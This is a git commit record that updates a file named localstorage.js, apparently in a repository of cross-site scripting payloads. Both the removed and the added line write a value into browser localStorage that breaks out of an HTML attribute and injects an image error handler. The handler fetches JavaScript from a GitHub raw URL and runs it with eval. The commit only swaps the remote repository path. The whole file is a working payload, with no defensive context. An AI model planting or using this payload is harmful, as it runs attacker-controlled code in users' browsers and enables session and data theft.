08d66b715b76d2edac60b331dcc25bde2e759c42
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-11 14:44:13 +0100

    Update localstorage.js

--- localstorage.js
+++ localstorage.js
@@ -1,1 +1,1 @@
-localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/localstorage.js').then(r=>r.text()).then(c=>eval(c))">`);
+localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/XSS/refs/heads/main/localstorage.js').then(r=>r.text()).then(c=>eval(c))">`);
